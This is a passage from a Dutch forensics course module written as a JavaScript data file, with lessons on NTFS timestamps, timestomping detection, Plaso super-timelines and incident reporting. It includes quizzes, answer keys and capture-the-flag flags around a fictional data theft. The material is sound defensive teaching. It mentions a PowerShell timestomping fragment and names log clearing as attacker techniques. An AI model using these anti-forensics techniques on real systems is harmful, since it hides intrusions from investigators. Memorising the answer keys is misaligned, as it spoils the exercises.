            <tr><td><strong>C</strong></td><td>MFT Changed (metadata)</td><td>Het MFT-record veranderde: naam, rechten, grootte of tijdstempels</td></tr>
            <tr><td><strong>B</strong></td><td>Born (Created)</td><td>Het bestand is op dit volume aangemaakt</td></tr>
          </tbody>
        </table>
        <div class="callout info"><strong>Let op de C:</strong> in NTFS betekent de C <em>niet</em> "Created" maar "MFT entry Changed". De aanmaaktijd is de B. In Plaso en Timeline Explorer zie je daarom kolommen als <code>MACB</code> met puntjes, bijvoorbeeld <code>M.C.</code> voor een gebeurtenis waarbij inhoud én metadata veranderden.</div>

        <h3>Twee sets tijden: $SI en $FN</h3>
        <p>Elk MFT-record bewaart de MACB-tijden <strong>twee keer</strong>:</p>
        <ul>
          <li><strong>$STANDARD_INFORMATION ($SI)</strong> — de tijden die Verkenner en <code>dir</code> tonen. Programma's kunnen ze via een gewone Windows-API aanpassen.</li>
          <li><strong>$FILE_NAME ($FN)</strong> — een tweede set die hoort bij de bestandsnaam. Die wordt door Windows zelf bijgewerkt (bij aanmaken, hernoemen of verplaatsen) en is via normale API's <strong>niet</strong> aan te passen.</li>
        </ul>

        <h3>Timestomping</h3>
        <p><strong>Timestomping</strong> is het vervalsen van tijdstempels, zodat malware oud en onschuldig lijkt — alsof hij er al jaren staat. Tools als PowerShell (<code>(Get-Item x).CreationTime = ...</code>) of speciale aanvalstools passen dan de <strong>$SI-tijden</strong> aan. Maar de $FN-tijden blijven meestal staan. Daardoor ontstaan klassieke rode vlaggen:</p>
        <ol>
          <li><strong>$SI B ligt vóór $FN B.</strong> Een bestand kan niet eerder zijn aangemaakt dan zijn eigen naam. Normaal is $SI B gelijk aan of later dan $FN B.</li>
          <li><strong>Ronde tijden.</strong> NTFS bewaart tijden tot op 100 nanoseconden (7 decimalen). Een echte tijd als <code>08:46:14.5123311</code> is "rommelig"; een vervalste tijd als <code>10:00:00.0000000</code> is verdacht rond.</li>
          <li><strong>C past niet bij B/M/A.</strong> Bij het aanpassen van de tijden verandert het MFT-record, dus de $SI C verraadt vaak <em>wanneer</em> er gestompt is.</li>
          <li><strong>Context.</strong> Een bestand "uit 2019" in een map die vandaag pas is aangemaakt, klopt niet.</li>
        </ol>
        <div class="callout tip"><strong>Extra bevestiging:</strong> het USN-journaal (<code>$UsnJrnl</code>) logt wijzigingen aan bestanden, waaronder <code>BASIC_INFO_CHANGE</code> wanneer tijdstempels zijn aangepast. Zo kun je het stompen soms tot op de seconde dateren.</div>

        <h3>Onderzoek de $MFT</h3>
        <p>Hieronder staat een uitsnede van de $MFT van werkstation <strong>WS-LOG-12</strong>, zoals <strong>MFTECmd</strong> (Eric Zimmerman) hem uitvoert. Per bestand zie je een $SI- en een $FN-regel. Filter bijvoorbeeld op <code>upd</code> of op <code>/\\.0000000/</code> en vergelijk de regels per Entry-nummer.</p>
      `,
      lab: { type: 'logs', title: 'MFTECmd — $MFT WS-LOG-12 (uitsnede)', lines: MFT_LINES },
      questions: [
        { q: 'Welk bestand in de uitsnede is getimestompt? (alleen de bestandsnaam)', answer: ['rclone.exe', 'rclone', 'C:\\ProgramData\\upd\\rclone.exe'], hint: 'Zoek een $SI-regel waarvan de B-tijd vóór de $FN-tijd ligt en verdacht rond is.', explain: 'Bij rclone.exe staat $SI B op 2019-03-14 10:00:00.0000000, terwijl $FN B 2026-10-01 08:46:14 is: de $SI-tijden zijn vervalst.' },
        { q: 'Hoe laat (UTC) zijn de tijdstempels van dat bestand vermoedelijk aangepast, af te lezen aan de $SI C-tijd? (UU:MM:SS)', answer: ['08:47:02', '2026-10-01 08:47:02', '08:47:02.1184420'], hint: 'Kijk in de kolom C (MFT Changed) van de $SI-regel.', explain: 'Bij het stompen veranderde het MFT-record; de $SI C-tijd 08:47:02 verraadt het moment. Het USN-journaal bevestigt dat in de tijdlijn van taak 6.' },
        { q: 'Waarom vertrouw je bij twijfel eerder op $FN dan op $SI?', options: ['$FN wordt vaker bijgewerkt', '$FN is via normale Windows-API\'s niet aan te passen, $SI wel', '$FN staat altijd in lokale tijd', '$SI bestaat niet op NTFS'], answer: 1, explain: 'Gewone programma\'s en tools passen alleen $SI aan; $FN wordt door het besturingssysteem beheerd en blijft daardoor meestal intact.' },
        { q: 'Welke vlag staat er in de $MFT-uitsnede?', answer: ['JVT{fn_verraadt_timestomping}'], hint: 'Filter op JVT; de vlag zit in een bestandsnaam in C:\\ProgramData\\upd.', explain: 'In de map van de aanvaller staat het bestand todo_JVT{fn_verraadt_timestomping}.txt.' },
      ],
    },

    {
      title: 'Taak 5 — Bronnen en gereedschap voor een super-timeline',
      content: `
        <p>Een sterke tijdlijn rust op <strong>meerdere, onafhankelijke bronnen</strong>. Zegt de Prefetch dat een programma om 09:01 draaide, laat het eventlog een 4688 zien op hetzelfde moment, en ziet de proxy vier seconden later een uploadverbinding, dan staat je bewering stevig. Eén bron kan liegen of ontbreken; drie bronnen die elkaar bevestigen, overtuigen.</p>

        <h3>De belangrijkste bronnen op een Windows-werkstation</h3>
        <table>
          <thead><tr><th>Bron</th><th>Wat het je vertelt</th><th>Let op</th></tr></thead>
          <tbody>
            <tr><td><strong>Eventlogs</strong> (Security, System, TerminalServices)</td><td>Aanmeldingen (4624/4625), processen (4688), services (7045), gewiste logs (1102/104)</td><td>Kan gewist zijn; een SIEM-kopie redt je dan vaak</td></tr>
            <tr><td><strong>Prefetch</strong></td><td>Uitvoering van programma's, run count, tot 8 laatste uitvoertijden</td><td>Tijdstempel van het .pf-bestand ligt ~10 seconden na de start</td></tr>
            <tr><td><strong>$MFT en $UsnJrnl</strong></td><td>Aanmaken, wijzigen, hernoemen en verwijderen van bestanden</td><td>Let op timestomping (taak 4)</td></tr>
            <tr><td><strong>LNK-bestanden en jumplists</strong></td><td>Welke bestanden en mappen een gebruiker opende, ook op USB of netwerkshares</td><td>Per gebruikersprofiel</td></tr>
            <tr><td><strong>Browsergeschiedenis</strong></td><td>Bezochte websites, downloads, zoekopdrachten</td><td>Chrome/Edge gebruiken WebKit-tijd</td></tr>
            <tr><td><strong>Firewall en proxy</strong></td><td>Verbindingen naar binnen en naar buiten, hoeveelheden data</td><td>Vaak lokale tijd en een eigen klok: controleer de afwijking</td></tr>
          </tbody>
        </table>

        <h3>Plaso / log2timeline</h3>
        <p><strong>Plaso</strong> is de bekendste open-source-tool om automatisch een super-timeline te bouwen. Hij bestaat uit een paar onderdelen:</p>
        <ul>
          <li><strong>log2timeline</strong> — doorzoekt een schijfkopie (of map) en haalt met honderden <em>parsers</em> tijdstempels uit eventlogs, de registry, de $MFT, browsers, Prefetch en nog veel meer. Het resultaat is een opslagbestand (<code>.plaso</code>).</li>
          <li><strong>psort</strong> — sorteert en filtert dat opslagbestand en exporteert het, bijvoorbeeld naar CSV, in een tijdzone naar keuze (kies UTC).</li>
          <li><strong>pinfo</strong> — laat zien welke parsers hebben gedraaid en hoeveel events er gevonden zijn.</li>
        </ul>
        <pre><code>log2timeline.py --storage-file zaak131.plaso ws-log-12.E01
psort.py -o l2tcsv --output-time-zone UTC -w zaak131.csv zaak131.plaso</code></pre>
        <p>Je hoeft dit nu niet te installeren: het lab in de volgende taak werkt met een kant-en-klare uitsnede. Bedenk wel dat een volledige super-timeline van één laptop zomaar <strong>miljoenen</strong> regels oplevert. Filteren op een tijdvenster rond een bekend punt is daarom essentieel.</p>

        <h3>Timeline Explorer</h3>
        <p><strong>Timeline Explorer</strong> van Eric Zimmerman is een gratis Windows-programma om zulke grote CSV-tijdlijnen te bekijken: kolommen filteren, groeperen, zoeken en interessante regels markeren (taggen). Het werkt prima samen met de uitvoer van Plaso en van de andere EZ-tools, zoals MFTECmd en PECmd.</p>

        <div class="callout warn"><strong>Ethiek:</strong> een super-timeline toont alles wat een gebruiker deed, ook privézaken. Werk alleen met een opdracht of machtiging, beperk je tot wat relevant is voor de onderzoeksvraag, en ga zorgvuldig om met persoonsgegevens (AVG).</div>
      `,
      questions: [
        { q: 'Welk onderdeel van Plaso haalt de tijdstempels uit een schijfkopie en schrijft ze naar een .plaso-bestand?', answer: ['log2timeline', 'log2timeline.py'], hint: 'De naam zegt het al: logs naar een tijdlijn.', explain: 'log2timeline verwerkt de bron met parsers; psort sorteert en exporteert het resultaat.' },
        { q: 'Met welk Plaso-onderdeel exporteer je de tijdlijn naar bijvoorbeeld CSV in UTC?', answer: ['psort', 'psort.py'], hint: 'Het "sorteert" de opslag.', explain: 'psort filtert, sorteert en exporteert een .plaso-bestand, met --output-time-zone UTC voor genormaliseerde tijden.' },
        { q: 'Welke bron laat het duidelijkst zien dat een programma is uitgevoerd, inclusief een run count?', options: ['Browsergeschiedenis', 'Prefetch', 'Firewalllog', 'Jumplist'], answer: 1, explain: 'Prefetch bewijst uitvoering en bewaart een teller en de laatste uitvoertijden.' },
        { q: 'Welke gratis tool van Eric Zimmerman gebruik je om grote CSV-tijdlijnen te filteren en te taggen?', answer: ['timeline explorer', 'timelineexplorer', 'timelineexplorer.exe'], hint: 'Twee woorden: tijdlijn + verkenner, in het Engels.', explain: 'Timeline Explorer is gemaakt om grote tijdlijnen (o.a. van Plaso en de EZ-tools) door te lopen.' },
      ],
    },

    {
      title: 'Taak 6 — Praktijk: de super-timeline van WS-LOG-12',
      content: `
        <p>Het fictieve bedrijf <strong>Tulpstad Logistiek</strong> krijgt op 2 oktober 2026 een melding: op een cloudopslagdienst staat een archief met hun financiële jaarcijfers te koop. Het SOC vermoedt dat het lek via werkstation <strong>WS-LOG-12</strong> (192.0.2.45) liep, van medewerker <strong>s.vermeulen</strong>. Jij krijgt de super-timeline van 1 oktober 2026.</p>

        <div class="callout info"><strong>Werkafspraken van dit onderzoek:</strong>
          <ul>
            <li>Alle tijden in het lab zijn al genormaliseerd naar <strong>UTC</strong>. De proxy schreef in CEST (−2 uur gecorrigeerd) en de firewallklok liep 2 minuten achter (+2 minuten gecorrigeerd).</li>
            <li>De Security- en System-events komen uit de SIEM-kopie (Windows Event Forwarding). Daarom zie je ze ook nog na het moment dat het lokale log is gewist.</li>
          </ul>
        </div>

        <h3>Ruis en signaal</h3>
        <p>Een echte tijdlijn bestaat voor het grootste deel uit <strong>ruis</strong>: gewoon gebruik, updates, geplande taken en virusscans. Dat is geen afval, maar je referentie. Door eerst te zien hoe een normale werkdag van s.vermeulen eruitziet (Outlook, Teams, het intranet), valt afwijkend gedrag — een ander account, een extern IP-adres, tools in een vreemde map — veel sneller op.</p>

        <h3>Aanpak</h3>
        <ol>
          <li><strong>Krijg overzicht.</strong> Scrol de tijdlijn één keer door. Welke bronnen zie je? Wat is normaal gedrag van s.vermeulen?</li>
          <li><strong>Zoek een ankerpunt.</strong> Filter op <code>4625</code> en <code>4624</code>. Wanneer slaagt een aanmelding na een reeks mislukkingen, en vanaf welk IP-adres?</li>
          <li><strong>Pivoteer vanaf dat anker.</strong> Zet het tijdvenster vanaf de aanmelding en kijk welk programma als eerste start (4688 en Prefetch).</li>
          <li><strong>Volg de bestanden.</strong> Filter op <code>upd</code>: wat wordt er gedownload, aangemaakt, aangepast en weer verwijderd? Herken je rclone.exe uit taak 4?</li>
          <li><strong>Volg de data.</strong> Waar gaat het archief heen? Combineer Proxy en Firewall.</li>
          <li><strong>Zoek het opruimwerk.</strong> Filter op <code>/1102|104|wevtutil/</code>.</li>
        </ol>
        <p>Markeer de belangrijke events met ⭐: die heb je straks nodig voor je rapport. Gebruik de Δ-kolom om de tijd tussen gebeurtenissen te zien. Ergens in een beschrijving staat ook een vlag; lees de events in de map van de aanvaller goed.</p>

        <div class="callout tip"><strong>Denk als onderzoeker:</strong> één event bewijst weinig. Dat de aanvaller de uploadtool echt gebruikte, zie je pas sterk als de 4688, de Prefetch, de proxy én de firewall hetzelfde verhaal vertellen.</div>
      `,
      lab: { type: 'timeline', title: 'Zaak 2026-131 — WS-LOG-12', events: TIMELINE_EVENTS },
      questions: [
        { q: 'Hoe laat (UTC) was de eerste GESLAAGDE aanmelding van de aanvaller? (UU:MM:SS)', answer: ['08:44:19', '2026-10-01 08:44:19', '2026-10-01T08:44:19Z', '08:44:19 utc'], hint: 'Filter op 4624 en kijk naar type 10 (RDP) vanaf een extern IP-adres.', explain: 'Na vijf mislukte pogingen (4625) slaagt om 08:44:19 UTC een RDP-aanmelding (4624 type 10) als adm.backup vanaf 203.0.113.77.' },
        { q: 'Welk programma werd als eerste uitgevoerd na die aanmelding?', answer: ['powershell.exe', 'powershell', 'windows powershell'], hint: 'Zoek de eerste 4688 of Prefetch-regel na 08:44:19.', explain: 'Om 08:45:37 start powershell.exe (4688, bevestigd door Prefetch). Daarmee werden rclone en 7za gedownload (User-Agent WindowsPowerShell).' },
        { q: 'Hoeveel minuten zaten er tussen de geslaagde RDP-aanmelding en het wissen van het Security-log (1102)?', answer: ['41', '41 minuten', '41 min'], hint: 'Van 08:44:19 tot het 1102-event.', explain: '08:44:19 → 09:25:19 is precies 41 minuten. In die tijd werd de data ingepakt en geüpload.' },
        { q: 'Welke vlag staat in de beschrijving van een event?', answer: ['JVT{super_timeline_spoorzoeker}'], hint: 'Filter op JVT of bekijk de MFT-events in C:\\ProgramData\\upd.', explain: 'De vlag stond in het fragment van rclone.conf, de configuratie voor de upload naar upload.cloudvault.example.' },
      ],
    },

    {
      title: 'Taak 7 — Rapporteren: chronologisch, met bron per bewering',
      content: `
        <p>De beste analyse is waardeloos als niemand haar kan volgen of narekenen. Je rapport wordt gelezen door de directie, de jurist, misschien de Autoriteit Persoonsgegevens of — bij aangifte — de Politie en de rechter. Schrijf het dus zo dat een niet-technicus het verhaal snapt en een andere onderzoeker elke stap kan controleren.</p>

        <h3>Vier regels voor een tijdlijnrapport</h3>
        <ol>
          <li><strong>Chronologisch.</strong> Vertel het verhaal in de volgorde waarin het gebeurde, met tijden in UTC (en eventueel lokale tijd tussen haakjes).</li>
          <li><strong>Bron per bewering.</strong> Achter elke bewering staat waar je dat ziet: welk artefact, welke regel, welk event-ID.</li>
          <li><strong>Feiten gescheiden van interpretatie.</strong> "Om 09:01:10 startte rclone.exe" is een feit. "De aanvaller heeft de financiële data gestolen" is een conclusie die je onderbouwt met meerdere feiten.</li>
          <li><strong>Methode en beperkingen.</strong> Noteer welke tijdzone en klokcorrecties je toepaste, welke bronnen ontbraken (bijvoorbeeld het gewiste lokale Security-log), en wat je níét kunt vaststellen.</li>
        </ol>

        <h3>Voorbeeld: tijdlijn in het rapport</h3>
        <table>
          <thead><tr><th>Tijd (UTC)</th><th>Gebeurtenis (feit)</th><th>Bron</th></tr></thead>
          <tbody>
            <tr><td>08:40:03–08:42:36</td><td>5 mislukte RDP-aanmeldingen vanaf 203.0.113.77</td><td>Security 4625 (SIEM)</td></tr>
            <tr><td>08:44:19</td><td>Geslaagde RDP-aanmelding als adm.backup vanaf 203.0.113.77</td><td>Security 4624 type 10; TerminalServices 21; firewall</td></tr>
            <tr><td>08:45:37</td><td>powershell.exe gestart</td><td>Security 4688; Prefetch</td></tr>
            <tr><td>08:46:11–08:46:30</td><td>rclone en 7za gedownload naar C:\\ProgramData\\upd</td><td>Proxy; $MFT</td></tr>
            <tr><td>08:47:02</td><td>Tijdstempels van rclone.exe aangepast naar 2019</td><td>$UsnJrnl; $MFT ($SI vs $FN)</td></tr>
            <tr><td>09:01:10–09:24:47</td><td>Upload van ca. 1,97 GB naar upload.cloudvault.example</td><td>Security 4688; Prefetch; proxy; firewall</td></tr>
            <tr><td>09:25:19</td><td>Security-log gewist</td><td>Security 1102</td></tr>
          </tbody>
        </table>

        <h3>Interpretatie, apart en voorzichtig geformuleerd</h3>
        <p>"Op basis van de bovenstaande feiten is het <em>aannemelijk</em> dat een externe partij met het account adm.backup, waarvan het wachtwoord vermoedelijk is geraden, het archief fin_q3.7z met de map Jaarcijfers heeft samengesteld en geüpload. Of de inhoud van het archief overeenkomt met de aangeboden gegevens, is met deze bronnen niet vast te stellen."</p>

        <div class="callout warn"><strong>Valkuil:</strong> schrijf nooit "s.vermeulen heeft de data gelekt" omdat het om zijn werkstation gaat. Zijn eigen account was vergrendeld van 08:30:02 tot 09:31:15; de activiteit liep via een ander account vanaf een extern IP-adres. Een tijdlijn kan iemand dus ook <em>ontlasten</em>.</div>
        <div class="callout tip"><strong>Vervolgstappen:</strong> een goed rapport eindigt met aanbevelingen, zoals: RDP niet direct aan internet, MFA en lockout-beleid op beheeraccounts, het wachtwoord van adm.backup resetten, en de gelekte data en de meldplicht bij de AP beoordelen.</div>
      `,
      questions: [
        { q: 'Welk IP-adres noteer je in het rapport als bron van de kwaadaardige RDP-aanmelding?', answer: ['203.0.113.77'], hint: 'Staat bij de 4624 type 10 in de tijdlijn van taak 6.', explain: 'Alle mislukte pogingen, de geslaagde aanmelding en de firewallregels wijzen naar 203.0.113.77.' },
        { q: 'Welke uitspraak is een FEIT en geen interpretatie?', options: ['De aanvaller wilde de jaarcijfers verkopen', 'Om 09:01:10 UTC werd rclone.exe gestart (Security 4688, Prefetch)', 'Het wachtwoord van adm.backup was waarschijnlijk zwak', 's.vermeulen werkte mee met de aanvaller'], answer: 1, explain: 'Alleen het starten van rclone.exe is direct waargenomen in twee bronnen; de rest zijn interpretaties of ongefundeerde beschuldigingen.' },
        { q: 'Waarom vermeld je in het rapport welke tijdzone en klokcorrecties je hebt toegepast?', options: ['Omdat dat wettelijk verboden is om weg te laten', 'Zodat anderen je tijdlijn kunnen narekenen en controleren', 'Omdat UTC anders niet bestaat', 'Om het rapport langer te maken'], answer: 1, explain: 'Reproduceerbaarheid: wie je bronnen en correcties kent, kan elke tijd in je rapport zelf controleren.' },
      ],
    },
  ],

  terms: [
    { term: 'Tijdlijn (timeline)', def: 'Chronologisch overzicht van gebeurtenissen; de ruggengraat van een forensisch onderzoek.' },
    { term: 'Super-timeline', def: 'Tijdlijn waarin tijdstempels uit veel verschillende bronnen (eventlogs, bestandssysteem, browser, netwerk) samen op één tijdas staan.' },
    { term: 'UTC', def: 'Coordinated Universal Time: de wereldwijde referentietijd zonder zomertijd, waarnaar je alle tijden normaliseert.' },
    { term: 'CET / CEST', def: 'Midden-Europese (Zomer)tijd, de Nederlandse tijdzone Europe/Amsterdam: UTC+1 in de winter, UTC+2 in de zomer.' },
    { term: 'Klokafwijking (clock skew)', def: 'Het verschil tussen de klok van een systeem en de werkelijke tijd; vast te stellen via een gebeurtenis die in twee bronnen staat.' },
    { term: 'Epoch', def: 'Het vaste beginpunt van een tijdstempelformaat, zoals 1970-01-01 (Unix), 1601-01-01 (FILETIME, WebKit) of 2001-01-01 (Cocoa).' },
    { term: 'Windows FILETIME', def: 'Aantal 100-nanoseconde-intervallen sinds 1601-01-01 UTC; gebruikt in NTFS, de registry en eventlogs.' },
    { term: 'MACB', def: 'Modified, Accessed, MFT Changed en Born: de vier NTFS-tijdstempels van een bestand.' },
    { term: '$STANDARD_INFORMATION / $FILE_NAME', def: 'De twee MFT-attributen met MACB-tijden; $SI is via API\'s aan te passen, $FN wordt door Windows beheerd.' },
    { term: 'Timestomping', def: 'Het vervalsen van tijdstempels (meestal de $SI) om sporen te verbergen; te ontdekken door $SI met $FN en het USN-journaal te vergelijken.' },
    { term: 'Plaso / log2timeline', def: 'Open-source-tool die met parsers automatisch een super-timeline uit een schijfkopie bouwt; psort exporteert het resultaat.' },
    { term: 'Pivoteren (pivoting)', def: 'Vanuit één bekend punt (tijdstip, account, IP-adres) verder zoeken naar wat er rondom gebeurde.' },
  ],

  resources: [
    { title: 'Plaso (log2timeline) — documentatie', url: 'https://plaso.readthedocs.io/' },
    { title: 'Eric Zimmerman\'s tools — o.a. Timeline Explorer en MFTECmd', url: 'https://ericzimmerman.github.io/' },
    { title: 'SANS — DFIR-posters (o.a. Windows Forensic Analysis)', url: 'https://www.sans.org/posters/' },
  ],
});
